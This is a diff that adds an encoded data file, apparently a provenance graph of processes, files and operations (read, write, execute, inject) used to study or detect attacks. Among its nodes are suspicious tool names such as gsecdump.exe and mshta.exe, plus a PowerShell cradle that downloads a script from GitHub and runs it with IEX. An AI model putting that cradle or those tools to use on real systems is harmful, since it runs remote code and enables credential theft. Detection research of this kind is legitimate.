@@ -1,0 +1,103 @@
+26
+MP*-mshta.exe
+SF-C:\Windows\system32\taskmgr
+TF-C:\Users\admin\AppData\Roaming\damianocrnofj6793.exe
+MF-C:\Users\admin\AppData\Local\Temp\EasyValorant.exe
+MF-C:\Users\admin\AppData\Local\Temp\fast1nject.exe
+TP-WtHgie
+MP-cacls.exe
+MF-C:\Windows\System32\wscript.exe
+MP-dvRzzWRPw.exe
+SO-https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_
+TF-\Windows\system32\makecab.exe
+MF-Files\Hantek2xx2\STTubeDevice30.dll
+MP-p2602380.exe
+TP-jerkoff.exe 
+TF-C:\Windows\System32\WScript.exe
+MP*-gsecdump.exe
+MF-\Users\admin\AppData\Local\Temp\PO-465514-180820.doc
+SF-C:\Users\admin\AppData\Local\Temp\factura
+TP*-suifsc.exe 
+TP*-cmd.exe 
+TP-msedge.exe
+MP-nsA042.tmp
+MP-pcalua.exe
+MP-secedit.exe
+SF-C:\Program files\appdata\local\temp\3893.bmp
+TP-MV DESPINA.exe 
+74
+0 1 WR-1
+0 2 RD-1
+0 3 RD-1
+0 4 EX-1
+0 5 IJ-1
+5 1 WR-1
+5 2 UK-1
+0 6 FR-1
+6 1 EX-1
+6 3 WR-1
+6 4 UK-1
+0 7 WR-1
+0 8 FR-1
+8 1 RD-1
+8 3 RD-1
+8 7 RD-1
+0 9 ST-1
+8 9 ST-2
+0 10 RD-1
+8 10 RD-1
+8 11 EX-1
+12 3 RD-1
+12 7 RD-1
+12 9 ST-2
+12 10 RD-1
+12 11 CD-1
+13 3 WR-1
+13 7 EX-1
+8 13 IJ-1
+13 9 ST-2
+13 10 WR-1
+13 11 EX-1
+12 13 UK-1
+8 14 RD-1
+15 7 RD-2
+9 15 RF-2
+15 10 WR-2
+15 11 WR-2
+15 14 WR-2
+8 16 RD-1
+15 16 WR-2
+8 17 WR-1
+15 17 WR-2
+8 18 IJ-1
+18 9 ST-3
+18 10 WR-3
+18 11 WR-3
+18 14 WR-3
+15 18 IJ-2
+18 16 WR-3
+18 17 WR-3
+9 19 RF-1
+19 10 RD-4
+19 11 RD-4
+19 14 WR-4
+15 19 IJ-2
+19 16 RD-4
+19 17 WR-4
+18 19 IJ-3
+20 10 WR-4
+20 11 WR-4
+20 14 WR-4
+15 20 IJ-2
+20 16 UK-4
+21 11 UK-4
+22 14 RD-4
+15 22 UK-2
+23 14 CD-4
+23 17 RD-4
+18 23 IJ-3
+19 23 UK-4
+18 24 EX-3
+25 17 RD-4
+18 25 UK-3
+
